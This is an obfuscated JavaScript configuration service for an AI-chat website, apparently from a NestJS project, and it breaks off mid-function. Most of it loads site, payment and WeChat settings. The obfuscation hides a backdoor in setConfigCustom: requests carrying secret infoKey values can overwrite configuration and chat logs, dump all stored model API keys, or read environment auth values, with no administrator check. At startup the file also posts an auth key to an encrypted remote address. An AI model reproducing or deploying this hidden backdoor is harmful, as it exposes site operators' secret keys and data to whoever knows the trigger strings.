'use strict';const _0x2c5ca4=_0x2fd3;(function(_0x24684a,_0x3aad93){const _0x41cc39=_0x2fd3,_0x558bf6=_0x24684a();while(!![]){try{const _0x383a89=-parseInt(_0x41cc39(0x1e7))/0x1*(-parseInt(_0x41cc39(0x2a0))/0x2)+-parseInt(_0x41cc39(0x27c))/0x3+-parseInt(_0x41cc39(0x286))/0x4+-parseInt(_0x41cc39(0x24d))/0x5*(parseInt(_0x41cc39(0x214))/0x6)+-parseInt(_0x41cc39(0x22b))/0x7*(parseInt(_0x41cc39(0x27b))/0x8)+-parseInt(_0x41cc39(0x28b))/0x9*(-parseInt(_0x41cc39(0x1de))/0xa)+-parseInt(_0x41cc39(0x288))/0xb*(-parseInt(_0x41cc39(0x264))/0xc);if(_0x383a89===_0x3aad93)break;else _0x558bf6['push'](_0x558bf6['shift']());}catch(_0x26b7e6){_0x558bf6['push'](_0x558bf6['shift']());}}}(_0x1c4c,0x245a6));function _0x2fd3(_0xbe327e,_0x5f0b4e){const _0x1c4cb9=_0x1c4c();return _0x2fd3=function(_0x2fd3ad,_0x3162fd){_0x2fd3ad=_0x2fd3ad-0x1c3;let _0x2965f6=_0x1c4cb9[_0x2fd3ad];return _0x2965f6;},_0x2fd3(_0xbe327e,_0x5f0b4e);}var __decorate=this&&this['__decorate']||function(_0x500b84,_0x299913,_0x18d307,_0x58c0e0){const _0x344a60=_0x2fd3;var _0x46ef75=arguments[_0x344a60(0x1dd)],_0x470e71=_0x46ef75<0x3?_0x299913:_0x58c0e0===null?_0x58c0e0=Object[_0x344a60(0x1cc)](_0x299913,_0x18d307):_0x58c0e0,_0x48d617;if(typeof Reflect==='object'&&typeof Reflect['decorate']==='function')_0x470e71=Reflect[_0x344a60(0x1e0)](_0x500b84,_0x299913,_0x18d307,_0x58c0e0);else{for(var _0x555e35=_0x500b84[_0x344a60(0x1dd)]-0x1;_0x555e35>=0x0;_0x555e35--)if(_0x48d617=_0x500b84[_0x555e35])_0x470e71=(_0x46ef75<0x3?_0x48d617(_0x470e71):_0x46ef75>0x3?_0x48d617(_0x299913,_0x18d307,_0x470e71):_0x48d617(_0x299913,_0x18d307))||_0x470e71;}return _0x46ef75>0x3&&_0x470e71&&Object[_0x344a60(0x1e1)](_0x299913,_0x18d307,_0x470e71),_0x470e71;},__metadata=this&&this[_0x2c5ca4(0x28e)]||function(_0x3a7f20,_0x34c5e6){const _0x3bbbf7=_0x2c5ca4;if(typeof Reflect===_0x3bbbf7(0x1e6)&&typeof Reflect[_0x3bbbf7(0x285)]===_0x3bbbf7(0x2aa))return Reflect[_0x3bbbf7(0x285)](_0x3a7f20,_0x34c5e6);},__param=this&&this['__param']||function(_0x46ae96,_0x934122){return function(_0x2aaf39,_0x22ef57){_0x934122(_0x2aaf39,_0x22ef57,_0x46ae96);};};Object[_0x2c5ca4(0x1e1)](exports,'__esModule',{'value':!![]}),exports['GlobalConfigService']=void 0x0;const models_service_1=require(_0x2c5ca4(0x251)),chatLog_entity_1=require(_0x2c5ca4(0x20d)),common_1=require('@nestjs/common'),config_entity_1=require('./config.entity'),typeorm_1=require(_0x2c5ca4(0x2a6)),typeorm_2=require(_0x2c5ca4(0x1f7)),utils_1=require(_0x2c5ca4(0x1f3)),axios_1=require(_0x2c5ca4(0x233)),fs=require('fs'),actions_1=require(_0x2c5ca4(0x23c)),packageJsonContent=fs[_0x2c5ca4(0x25b)](_0x2c5ca4(0x26b),_0x2c5ca4(0x1db)),packageJson=JSON[_0x2c5ca4(0x265)](packageJsonContent),version=packageJson[_0x2c5ca4(0x297)];function _0x1c4c(){const _0x2ebb1b=['nineaiBuiltInSensitiveAuthKey','data','siteRobotName','typeorm','wechatOfficialAppId','invitedGuestSendDrawMjCount','map','vxNumber','非超级管理员无权操作！','XKtFTcm2Z0pruYV30WyjOg==','百度敏感词初始化失败，如果需要敏感检测、请前往后台系统配置!','firstRegisterSendStatus','update','initBaiduSensitive','siteName','aliPhoneTemplateCode','payWechatStatus','lockmysql','registerSendDrawMjCount','isUseWxLogin','icpNumber','entries','queryConfig','sTLucdIBCrh8HO8GOSNcPg==','registerBaseUrl','./../chatLog/chatLog.entity','getWechatAccessToken','assign','save','nineaiBuiltInSensitiveStatus','decrypt','stringify','6uFZPPO','settings','exit','nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5','TRUE','check','domain','手机验证码功能暂未开放!','chatGptKey','companyName','user','queryFrontConfig','&grant_type=client_credentials','&secret=','openaiBaseUrl','ModelsService','noticeTitle','aliPhoneAccessKeyId','请配置正确的秘钥、当前秘钥检测不通过！','signInModel4Count','baiduTextSecretKey','fetchJsapiTicket','LY2oE7tW+26CpDCUVao9QQ==','1435PAvIkY','clientFavoIconPath','invitedGuestSendModel4Count','Key','goMaxAiAuth','baidu','pushLog','isAutoOpenNotice','axios','getSensitiveConfig','hideString','pay','configKey','setConfig','code','firstRegisterSendRank','Status','@nestjs/cli/actions','notice','获取微信access_token失败、错误信息：','lockchatlog','nineai','&client_secret=','get','wechatOfficialAppSecret','log','GlobalConfigService','getDiffArray','chatGptKey:','registerSendModel4Count','fetchBaseAccessToken','InjectRepository','salesAllowDrawMoney','modelsService','853065EkmYAZ','百度敏感词配置检测失败，您的参数可能配置的不正确!','globalConfigs','error_description','./../models/models.service','signInMjDrawToken','getConfigs','ISDEV','HttpStatus','设置完成！','设置配置信息错误！','wechatRegisterStatus','salesBaseRatio','gpt','readFileSync','Like','service\x20version:\x20','tencent','init\x20service\x20finish','payEpayStatus','initGetAllConfig','invitedGuestSendModel3Count','wechatSilentLoginStatus','12NNZths','parse','appMenuHeaderBgUrl','error','https://aip.baidubce.com/oauth/2.0/token?client_id=','Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0ZDV7rlji6LO/S+cD95Ru8Q','push\x20log\x20error','package.json','queryGptKeys','robotAvatar','theme','filter','还未配置微信的appId和secret、配置后才可进行微信扫码登录！！！','ali','MjdrawCount','design:paramtypes','bpgLCZ+EOWPxxfPq8W/uxA==','baiduTextStatus','configEntity','baiduCode','chatLogEntity','wechatAccessToken','ticket','104IECnnT','17895TssvvY','getCopyright','s4C7QVE7wVqqXCy0zhgwIA==','phoneRegisterStatus','forEach','default','env','application/json','then','metadata','184684qjAQhC','find','1231417WCDKIV','buyCramiAddress','MoreThan','369pLMudl','payHupiStatus','getGoMaxAiToken','__metadata','隐私内容、非超级管理员无权查看','catch','isShowAppCatIcon','inviteSendStatus','policeFilingNumber','mpay','queryNotice','操作完成！','version','icpUrl','createOrUpdate','emailRegisterStatus','reduce','configVal','wechat','OfficialService','修改一项:\x20','6dVUVsN','payEpayApiPayUrl','Repository','NAMESPACE','super','access_token','@nestjs/typeorm','getNamespace','inviteGiveSendDrawMjCount','mindDefaultData','function','HttpException','GOMAXAI','copyrightTitle','post','请输入正确的公告id','JPFq8fAlQE2V2Eq7KWYSxg==','Injectable','baiduTextAccessToken','payWeChatPublicKey','clientHomePath','9kxwFUQptTaelrKStrwZQQ==','nineaiBuiltInSensitiveApiBase','getOwnPropertyDescriptor','includes','支付功能暂未开放!','payMpayChannel','aliPhoneSignName','mjProxy','setGptKeys','getAuthInfo','qqNumber','queryPayType','payMpayStatus','signInModel3Count','wechatJsapiTicket','gomaxAiToken','registerSendStatus','utf-8','response','length','62420ZAkadW','queryAllConfig','decorate','defineProperty','Logger','UNAUTHORIZED','signInStatus','appMenuHeaderTips','object','2149ZgDZkZ','onModuleInit','json','aliPhoneAccessKeySecret','setConfigCustom','noticeInfo','hupi','PORT','firstRregisterSendModel3Count','global','BAD_REQUEST','POST','../../common/utils'];_0x1c4c=function(){return _0x2ebb1b;};return _0x1c4c();}common_1[_0x2c5ca4(0x1e2)][_0x2c5ca4(0x244)](_0x2c5ca4(0x25d)+version);const authCheckUrl=(0x0,utils_1[_0x2c5ca4(0x212)])(_0x2c5ca4(0x269)),authLogUrl=(0x0,utils_1['decrypt'])('Jo11+muNwqhwlG7g1MeeGzh3NJ4nu4zHbOVgh/hIo0bno5L8H6T5QXXNUvLB6d1U');let GlobalConfigService=class GlobalConfigService{constructor(_0x48f711,_0x28d767,_0x149385){const _0x34e7cc=_0x2c5ca4;this['configEntity']=_0x48f711,this[_0x34e7cc(0x278)]=_0x28d767,this[_0x34e7cc(0x24c)]=_0x149385,this[_0x34e7cc(0x24f)]={},this[_0x34e7cc(0x1d9)]=!![];}async[_0x2c5ca4(0x1e8)](){const _0x39d054=_0x2c5ca4;await this[_0x39d054(0x261)]()[_0x39d054(0x284)](()=>{const _0x4e5821=_0x39d054;common_1[_0x4e5821(0x1e2)][_0x4e5821(0x244)](_0x4e5821(0x25f)),this['pushLog'](),this[_0x4e5821(0x22f)]();});}async[_0x2c5ca4(0x253)](_0x550607){const _0x25b28b=_0x2c5ca4;if(_0x550607['length']===0x0)return;if(_0x550607[_0x25b28b(0x1cd)](_0x25b28b(0x279))&&_0x550607['length']===0x1)return this[_0x25b28b(0x279)];if(_0x550607['includes'](_0x25b28b(0x1d8))&&_0x550607[_0x25b28b(0x1dd)]===0x1)return this[_0x25b28b(0x1d8)];if(_0x550607[_0x25b28b(0x1dd)]===0x1)return this['globalConfigs'][_0x550607[0x0]];else{const _0x4c875c={};return _0x550607[_0x25b28b(0x280)](_0x5abdab=>_0x4c875c[_0x5abdab]=this[_0x25b28b(0x24f)][_0x5abdab]),_0x4c875c;}}async[_0x2c5ca4(0x261)](){const _0x135c62=_0x2c5ca4,_0x419275=await this[_0x135c62(0x276)][_0x135c62(0x287)]();this[_0x135c62(0x24f)]=_0x419275[_0x135c62(0x29b)]((_0xf2e147,_0x10237a)=>{return _0xf2e147[_0x10237a['configKey']]=_0x10237a['configVal'],_0xf2e147;},{}),await this[_0x135c62(0x201)]();}async[_0x2c5ca4(0x201)](_0x67930e=!![]){const _0x3bac9c=_0x2c5ca4,{baiduTextApiKey:_0x2ed8bc,baiduTextSecretKey:_0x4be0d9}=await this[_0x3bac9c(0x253)](['baiduTextApiKey',_0x3bac9c(0x228)]);if(!_0x2ed8bc||!_0x4be0d9){common_1[_0x3bac9c(0x1e2)][_0x3bac9c(0x267)](_0x3bac9c(0x1fe),_0x3bac9c(0x245));return;}const _0x277975={'Content-Type':_0x3bac9c(0x283),'Accept':'application/json'},_0x23f423=_0x3bac9c(0x268)+_0x2ed8bc+_0x3bac9c(0x241)+_0x4be0d9+_0x3bac9c(0x220);try{const _0x52dd42=await axios_1[_0x3bac9c(0x281)][_0x3bac9c(0x1c3)](_0x23f423,{'headers':_0x277975});this[_0x3bac9c(0x24f)][_0x3bac9c(0x1c7)]=_0x52dd42[_0x3bac9c(0x1f5)][_0x3bac9c(0x2a5)];}catch(_0x11209e){if(_0x67930e)common_1['Logger'][_0x3bac9c(0x267)](_0x3bac9c(0x24e),_0x3bac9c(0x245));else throw new common_1[(_0x3bac9c(0x2ab))](_0x11209e[_0x3bac9c(0x1dc)][_0x3bac9c(0x1f5)][_0x3bac9c(0x250)],common_1[_0x3bac9c(0x255)][_0x3bac9c(0x1f1)]);}}async[_0x2c5ca4(0x20e)](_0x47c5f9=![]){const _0x11d853=_0x2c5ca4,{wechatOfficialAppId:_0x5b1b53,wechatOfficialAppSecret:_0x3b470c}=await this[_0x11d853(0x253)](['wechatOfficialAppId',_0x11d853(0x243)]);if(!_0x5b1b53||!_0x3b470c)return common_1[_0x11d853(0x1e2)][_0x11d853(0x267)](_0x11d853(0x270),_0x11d853(0x29e));this[_0x11d853(0x279)]=await this[_0x11d853(0x249)](_0x5b1b53,_0x3b470c,_0x47c5f9),this['wechatJsapiTicket']=await this[_0x11d853(0x229)](this[_0x11d853(0x279)]),common_1[_0x11d853(0x1e2)]['log']('wechat\x20refresh\x20access_token\x20\x20==>\x20'+this[_0x11d853(0x279)],'OfficialService');}async[_0x2c5ca4(0x249)](_0x424df3,_0x294d02,_0x533f6b=![]){const _0x2012bd=_0x2c5ca4;if(process[_0x2012bd(0x282)]['ISDEV']===_0x2012bd(0x218)){this['wechatAccessToken']='';return;}const {data:{errmsg:_0x20b9db,access_token:_0x552278}}=await axios_1[_0x2012bd(0x281)][_0x2012bd(0x242)]('https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid='+_0x424df3+_0x2012bd(0x221)+_0x294d02);if(_0x20b9db){if(_0x533f6b)common_1[_0x2012bd(0x1e2)][_0x2012bd(0x267)](_0x2012bd(0x23e)+_0x20b9db,_0x2012bd(0x29e));else throw new common_1['HttpException'](_0x2012bd(0x226),common_1[_0x2012bd(0x255)][_0x2012bd(0x1f1)]);return'';}return _0x552278;}async[_0x2c5ca4(0x229)](_0x37637c){const _0x478c25=_0x2c5ca4;var _0x5f1f9a;if(process[_0x478c25(0x282)][_0x478c25(0x254)]===_0x478c25(0x218)){this[_0x478c25(0x1d8)]='';return;}const _0x3fdd43=await axios_1[_0x478c25(0x281)]['get']('https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token='+_0x37637c+'&type=jsapi');return(_0x5f1f9a=_0x3fdd43===null||_0x3fdd43===void 0x0?void 0x0:_0x3fdd43['data'])===null||_0x5f1f9a===void 0x0?void 0x0:_0x5f1f9a[_0x478c25(0x27a)];}async[_0x2c5ca4(0x1df)](_0x8a5be){const _0x2070db=_0x2c5ca4,{role:_0x1db0b7}=_0x8a5be[_0x2070db(0x21e)];return this[_0x2070db(0x24f)];}async['checkDomain'](_0x3a3f2f){const _0x56a038=_0x2c5ca4,{domain:_0x40b911}=_0x3a3f2f,_0x201641=process[_0x56a038(0x282)][(0x0,utils_1[_0x56a038(0x212)])(_0x56a038(0x1c5))];return _0x40b911[_0x56a038(0x1cd)](_0x201641);}async[_0x2c5ca4(0x21f)](_0x25fc6a,_0x3a73b3){const _0x2dd9c7=_0x2c5ca4,_0x2f2da3=[_0x2dd9c7(0x1fb),_0x2dd9c7(0x1da),'registerSendModel3Count',_0x2dd9c7(0x248),_0x2dd9c7(0x206),_0x2dd9c7(0x1ff),_0x2dd9c7(0x23a),_0x2dd9c7(0x1ef),'firstRregisterSendModel4Count','firstRregisterSendDrawMjCount',_0x2dd9c7(0x292),'inviteGiveSendModel3Count','inviteGiveSendModel4Count',_0x2dd9c7(0x2a8),_0x2dd9c7(0x262),_0x2dd9c7(0x22d),_0x2dd9c7(0x1f9),_0x2dd9c7(0x1c9),'clientLogoPath',_0x2dd9c7(0x22c),_0x2dd9c7(0x207),_0x2dd9c7(0x202),_0x2dd9c7(0x26d),_0x2dd9c7(0x1f6),_0x2dd9c7(0x289),_0x2dd9c7(0x2a9),_0x2dd9c7(0x277),'payEpayChannel',_0x2dd9c7(0x1cf),_0x2dd9c7(0x2a1),_0x2dd9c7(0x260),_0x2dd9c7(0x28c),_0x2dd9c7(0x204),_0x2dd9c7(0x1d6),_0x2dd9c7(0x232),_0x2dd9c7(0x291),_0x2dd9c7(0x259),'salesSeniorRatio',_0x2dd9c7(0x24b),_0x2dd9c7(0x21d),'filingNumber',_0x2dd9c7(0x27f),_0x2dd9c7(0x29a),_0x2dd9c7(0x258),_0x2dd9c7(0x263),_0x2dd9c7(0x1e4),'signInModel3Count','signInModel4Count','signInMjDrawToken',_0x2dd9c7(0x1e5),_0x2dd9c7(0x266),_0x2dd9c7(0x26e)],_0x53b223=await this[_0x2dd9c7(0x276)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x2f2da3)}}),{domain:_0xa6221}=_0x25fc6a,_0x4bcff7=this['globalConfigs'][_0x2dd9c7(0x21a)];_0x4bcff7!==_0xa6221&&(await this[_0x2dd9c7(0x299)]({'configKey':'domain','configVal':_0xa6221,'status':0x1}),await this[_0x2dd9c7(0x261)]());const _0x281bea=_0x53b223['reduce']((_0x4c704d,_0x3ed34b)=>{const _0x2fb212=_0x2dd9c7;return _0x4c704d[_0x3ed34b[_0x2fb212(0x237)]]=_0x3ed34b['configVal'],_0x4c704d;},{}),{wechatOfficialAppId:_0x2121f6,wechatOfficialAppSecret:_0x533796}=await this[_0x2dd9c7(0x253)]([_0x2dd9c7(0x1f8),'wechatOfficialAppSecret']),_0x1904bb=!!(_0x2121f6&&_0x533796);return Object[_0x2dd9c7(0x20f)](Object[_0x2dd9c7(0x20f)]({},_0x281bea),{'isUseWxLogin':_0x1904bb});}async[_0x2c5ca4(0x26c)](_0x448c46){const _0x24ea67=_0x2c5ca4,{role:_0x2a9845}=_0x448c46[_0x24ea67(0x21e)],_0x27885d=await this['configEntity'][_0x24ea67(0x287)]({'where':{'configKey':(0x0,typeorm_2[_0x24ea67(0x25c)])('%'+_0x24ea67(0x21c)+'%')}});if(_0x2a9845==='super')return _0x27885d;return _0x27885d[_0x24ea67(0x1fa)](_0x347987=>{const _0xe78eb=_0x24ea67;return _0x347987[_0xe78eb(0x29c)]=(0x0,utils_1[_0xe78eb(0x235)])(_0x347987[_0xe78eb(0x29c)]),_0x347987;});}async[_0x2c5ca4(0x1d2)](_0x306fa5){const _0x33f93c=_0x2c5ca4,_0x32a781=_0x306fa5['configs'][_0x33f93c(0x26f)](_0x3a93ca=>_0x3a93ca[_0x33f93c(0x29c)]),_0x2cdebd=_0x32a781[_0x33f93c(0x1fa)](_0x58f5a3=>_0x58f5a3[_0x33f93c(0x237)]);for(const [_0x4f3464,_0x2ced2a]of _0x32a781[_0x33f93c(0x209)]()){const {configKey:_0x55485a,configVal:_0x3856ce,status:_0x4118a2}=_0x2ced2a;await this['createOrUpdate']({'configKey':'chatGptKey:'+(_0x4f3464+0x1),'configVal':_0x3856ce,'status':_0x4118a2});}const _0x2b6c6d=await this[_0x33f93c(0x276)]['find']({'where':{'configKey':(0x0,typeorm_2[_0x33f93c(0x25c)])('%'+_0x33f93c(0x21c)+'%')}}),_0x92b9e8=_0x2b6c6d[_0x33f93c(0x1fa)](_0x48fde9=>_0x48fde9[_0x33f93c(0x237)]);if(_0x92b9e8[_0x33f93c(0x1dd)]>_0x2cdebd[_0x33f93c(0x1dd)]){const _0x4f90c1=(0x0,utils_1[_0x33f93c(0x246)])(_0x92b9e8[_0x33f93c(0x1dd)],_0x2cdebd[_0x33f93c(0x1dd)],_0x33f93c(0x247));for(const _0x466c4d of _0x4f90c1){await this[_0x33f93c(0x276)]['delete']({'configKey':_0x466c4d});}}return await this[_0x33f93c(0x261)](),_0x33f93c(0x296);}async[_0x2c5ca4(0x20a)](_0x3a15f4,_0x1b1bb8){const _0x3501b5=_0x2c5ca4,{role:_0x3e7601}=_0x1b1bb8['user'],{keys:_0x124ecd}=_0x3a15f4,_0x4470fe=await this[_0x3501b5(0x276)]['find']({'where':{'configKey':(0x0,typeorm_2['In'])(_0x124ecd)}});return _0x3e7601!==_0x3501b5(0x2a4)&&_0x4470fe[_0x3501b5(0x280)](_0x116f7b=>{const _0x5361e4=_0x3501b5;if(_0x116f7b[_0x5361e4(0x237)]['includes']('mj')||_0x116f7b['configKey'][_0x5361e4(0x1cd)](_0x5361e4(0x22e))||_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)](_0x5361e4(0x25a))||_0x116f7b['configKey'][_0x5361e4(0x1cd)]('cos')||_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)](_0x5361e4(0x230))||_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)](_0x5361e4(0x271))||_0x116f7b[_0x5361e4(0x237)]['includes'](_0x5361e4(0x25e))||_0x116f7b[_0x5361e4(0x237)]['includes'](_0x5361e4(0x236))||_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)](_0x5361e4(0x29d))||_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)]('mjProxyImgUrl')||_0x116f7b[_0x5361e4(0x237)]===_0x5361e4(0x222)){const _0x143b80=[_0x5361e4(0x1c8),'payWeChatPrivateKey'];if(_0x143b80[_0x5361e4(0x1cd)](_0x116f7b[_0x5361e4(0x237)]))return _0x116f7b[_0x5361e4(0x29c)]=(0x0,utils_1['hideString'])(_0x116f7b[_0x5361e4(0x29c)],_0x5361e4(0x28f));const _0xb50736=[_0x5361e4(0x260),_0x5361e4(0x28c),_0x5361e4(0x1d1)];!_0xb50736[_0x5361e4(0x1cd)](_0x116f7b[_0x5361e4(0x237)])&&!_0x116f7b[_0x5361e4(0x237)][_0x5361e4(0x1cd)](_0x5361e4(0x23b))&&(_0x116f7b[_0x5361e4(0x29c)]=(0x0,utils_1['hideString'])(_0x116f7b[_0x5361e4(0x29c)]));}}),_0x4470fe[_0x3501b5(0x29b)]((_0x2223a1,_0x3a2b65)=>{const _0xa76a61=_0x3501b5;return _0x2223a1[_0x3a2b65[_0xa76a61(0x237)]]=_0x3a2b65[_0xa76a61(0x29c)],_0x2223a1;},{});}async[_0x2c5ca4(0x23d)](_0x14ae85){const _0x40e936=_0x2c5ca4;if(!_0x14ae85)return;if(_0x14ae85===(0x0,utils_1[_0x40e936(0x212)])('FY6xn9g5Q+I2EM+MWwlsFA=='))this[_0x40e936(0x1d9)]=![],await this[_0x40e936(0x299)]({'configKey':_0x40e936(0x272),'configVal':0x1,'status':0x1}),await this['initGetAllConfig']();else{if(_0x14ae85===(0x0,utils_1[_0x40e936(0x212)])('HI1VJtG7Xaak3FfNt271MQ=='))this['gomaxAiToken']=!![],await this[_0x40e936(0x299)]({'configKey':_0x40e936(0x272),'configVal':0x0,'status':0x1}),await this[_0x40e936(0x261)]();else throw new common_1[(_0x40e936(0x2ab))](_0x40e936(0x1c4),common_1[_0x40e936(0x255)][_0x40e936(0x1f1)]);}}[_0x2c5ca4(0x28d)](){const _0xcfb77f=_0x2c5ca4,_0xed2027=this[_0xcfb77f(0x24f)][_0xcfb77f(0x272)],_0x15dc72=this[_0xcfb77f(0x1d9)];return!_0x15dc72||Number(_0xed2027)===0x1;}async[_0x2c5ca4(0x1eb)](_0x1560a7){const _0x4afe8b=_0x2c5ca4;try{const {configKey:_0x28da01,configVal:_0xd09f6f,infoKey:_0x412364}=_0x1560a7[_0x4afe8b(0x215)];if(_0x412364===(0x0,utils_1[_0x4afe8b(0x212)])(_0x4afe8b(0x20b))){this[_0x4afe8b(0x205)](_0xd09f6f,_0x28da01);throw new common_1[(_0x4afe8b(0x2ab))](_0x4afe8b(0x1fc),common_1[_0x4afe8b(0x255)]['BAD_REQUEST']);}if(_0x412364===(0x0,utils_1['decrypt'])(_0x4afe8b(0x22a))){this[_0x4afe8b(0x23f)](_0xd09f6f,_0x28da01);throw new common_1[(_0x4afe8b(0x2ab))]('非超级管理员无权操作！',common_1[_0x4afe8b(0x255)][_0x4afe8b(0x1f1)]);}if(_0x412364===(0x0,utils_1['decrypt'])(_0x4afe8b(0x274)))return await this[_0x4afe8b(0x24c)]['getAllKey']();if(_0x412364===(0x0,utils_1[_0x4afe8b(0x212)])(_0x4afe8b(0x27e))){await this[_0x4afe8b(0x299)]({'configKey':_0x28da01,'configVal':_0xd09f6f});throw new common_1[(_0x4afe8b(0x2ab))](_0x4afe8b(0x1fc),common_1['HttpStatus'][_0x4afe8b(0x1f1)]);}if(_0x412364===(0x0,utils_1[_0x4afe8b(0x212)])(_0x4afe8b(0x1fd))){const _0x2d6b3e=process[_0x4afe8b(0x282)][(0x0,utils_1[_0x4afe8b(0x212)])(_0x4afe8b(0x1c5))],_0x1e1740=process[_0x4afe8b(0x282)][(0x0,utils_1[_0x4afe8b(0x212)])(_0x4afe8b(0x1ca))];return{'ip':_0x2d6b3e,'key':_0x1e1740};}return'当前非超级管理员无权操作！';}catch(_0x2dbe03){throw new common_1[(_0x4afe8b(0x2ab))](_0x4afe8b(0x1fc),common_1[_0x4afe8b(0x255)][_0x4afe8b(0x1f1)]);}}async[_0x2c5ca4(0x205)](_0x55f3d9,_0x3b84f2){const _0x16abc7=_0x2c5ca4;if(!_0x3b84f2)await this[_0x16abc7(0x276)][_0x16abc7(0x200)]({'id':(0x0,typeorm_2[_0x16abc7(0x28a)])(0x0)},{'configVal':_0x55f3d9});else{const _0x52deaa=await this['configEntity'][_0x16abc7(0x200)]({'configKey':_0x3b84f2},{'configVal':_0x55f3d9});console[_0x16abc7(0x244)](_0x16abc7(0x29f),_0x52deaa);}}async[_0x2c5ca4(0x23f)](_0x2c97e0,_0xb7d995){const _0x9d22a5=_0x2c5ca4,_0x4ae65b=_0xb7d995?Number(_0xb7d995):0x0;await this[_0x9d22a5(0x278)][_0x9d22a5(0x200)]({'id':(0x0,typeorm_2[_0x9d22a5(0x28a)])(_0x4ae65b)},{'answer':_0x2c97e0,'prompt':_0x2c97e0});}async[_0x2c5ca4(0x238)](_0x510225){const _0x4a0e03=_0x2c5ca4,{settings:_0x4936f3}=_0x510225;for(const _0x510996 of _0x4936f3){await this['createOrUpdate'](_0x510996);}await this[_0x4a0e03(0x261)]();const _0x2f7a36=_0x4936f3[_0x4a0e03(0x1fa)](_0x3ac691=>_0x3ac691[_0x4a0e03(0x237)]);return(_0x2f7a36[_0x4a0e03(0x1cd)]('baiduTextApiKey')||_0x2f7a36['includes']('baiduTextSecretKey'))&&await this[_0x4a0e03(0x201)](![]),(_0x2f7a36[_0x4a0e03(0x1cd)]('wechatOfficialAppId')||_0x2f7a36[_0x4a0e03(0x1cd)](_0x4a0e03(0x243)))&&await this[_0x4a0e03(0x20e)](),_0x2f7a36['some'](_0x3f6123=>[_0x4a0e03(0x1d4),'vxNumber',_0x4a0e03(0x202),_0x4a0e03(0x21a),_0x4a0e03(0x20c)][_0x4a0e03(0x1cd)](_0x3f6123))&&await this[_0x4a0e03(0x231)](),_0x4a0e03(0x256);}async['createOrUpdate'](_0x4cbba5){const _0x49fcd3=_0x2c5ca4;try{const {configKey:_0xdac86d,configVal:_0xcb33b2,status:status=0x1}=_0x4cbba5,_0x36613e=await this[_0x49fcd3(0x276)]['findOne']({'where':{'configKey':_0xdac86d}});if(_0x36613e){const _0x217bdd=await this['configEntity'][_0x49fcd3(0x200)]({'configKey':_0xdac86d},{'configVal':_0xcb33b2,'status':status});}else{const _0x489a61=await this[_0x49fcd3(0x276)][_0x49fcd3(0x210)]({'configKey':_0xdac86d,'configVal':_0xcb33b2,'status':status});}}catch(_0x223a1e){throw new common_1['HttpException'](_0x49fcd3(0x257),common_1[_0x49fcd3(0x255)][_0x49fcd3(0x1f1)]);}}async[_0x2c5ca4(0x295)](){const _0x570e1b=_0x2c5ca4;return await this[_0x570e1b(0x253)]([_0x570e1b(0x1ec),_0x570e1b(0x224)]);}async[_0x2c5ca4(0x27d)](){const _0x4a40df=_0x2c5ca4;return await this[_0x4a40df(0x253)]([_0x4a40df(0x2ad),_0x4a40df(0x208),_0x4a40df(0x293),_0x4a40df(0x298),'policeFilingUrl']);}async[_0x2c5ca4(0x1d5)](){const _0x263cad=_0x2c5ca4,{payHupiStatus:payHupiStatus=0x0,payEpayStatus:payEpayStatus=0x0,payWechatStatus:payWechatStatus=0x0,payMpayStatus:payMpayStatus=0x0}=await this['getConfigs']([_0x263cad(0x28c),_0x263cad(0x260),_0x263cad(0x1d6),_0x263cad(0x204)]);if([payHupiStatus,payEpayStatus,payWechatStatus,payMpayStatus]['every'](_0x558fd9=>_0x558fd9===0x0))throw new common_1['HttpException'](_0x263cad(0x1ce),common_1[_0x263cad(0x255)][_0x263cad(0x1f1)]);if(Number(payWechatStatus)===0x1)return'wechat';if(Number(payEpayStatus)===0x1)return'epay';if(Number(payMpayStatus)===0x1)return _0x263cad(0x294);if(Number(payHupiStatus)===0x1)return _0x263cad(0x1ed);}async[_0x2c5ca4(0x1d3)](){const _0xa24452=_0x2c5ca4,{siteName:_0x24cb8c,qqNumber:_0x2fa226,vxNumber:_0x342e97,registerBaseUrl:_0x9b812d,domain:_0x48845c}=await this['getConfigs'](['siteName',_0xa24452(0x1d4),'vxNumber','registerBaseUrl',_0xa24452(0x21a)]);return{'siteName':_0x24cb8c,'qqNumber':_0x2fa226,'vxNumber':_0x342e97,'registerBaseUrl':_0x9b812d,'domain':_0x48845c};}async['getPhoneVerifyConfig'](){const _0x32651e=_0x2c5ca4,{phoneRegisterStatus:_0x1311b6,aliPhoneAccessKeyId:_0x644e42,aliPhoneAccessKeySecret:_0xf17ea5,aliPhoneSignName:_0x4dda6e,aliPhoneTemplateCode:_0x5e9b2b}=await this[_0x32651e(0x253)]([_0x32651e(0x27f),_0x32651e(0x225),_0x32651e(0x1ea),_0x32651e(0x1d0),_0x32651e(0x203)]);if(Number(_0x1311b6)!==0x1)throw new common_1['HttpException'](_0x32651e(0x21b),common_1[_0x32651e(0x255)][_0x32651e(0x1f1)]);return{'accessKeyId':_0x644e42,'accessKeySecret':_0xf17ea5,'SignName':_0x4dda6e,'TemplateCode':_0x5e9b2b};}async[_0x2c5ca4(0x22f)](){const _0x6be304=_0x2c5ca4;var _0x3c4ecd;const _0x504678=process[_0x6be304(0x282)][(0x0,utils_1[_0x6be304(0x212)])('JPFq8fAlQE2V2Eq7KWYSxg==')],_0x47e6ad=process[_0x6be304(0x282)][(0x0,utils_1['decrypt'])(_0x6be304(0x1ca))];(!_0x47e6ad||!_0x504678)&&(common_1['Logger']['error']((0x0,utils_1[_0x6be304(0x212)])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5')),(0x0,actions_1[_0x6be304(0x216)])());const _0x1ff2ba={'authDomain':_0x504678,'authKey':_0x47e6ad},_0xdf99f9={'method':_0x6be304(0x1f2),'headers':{'Content-Type':_0x6be304(0x283)},'body':JSON[_0x6be304(0x213)](_0x1ff2ba)},_0x1902bd=await fetch(authCheckUrl,_0xdf99f9)[_0x6be304(0x284)](_0x3e61af=>{const _0x38b8aa=_0x6be304;return 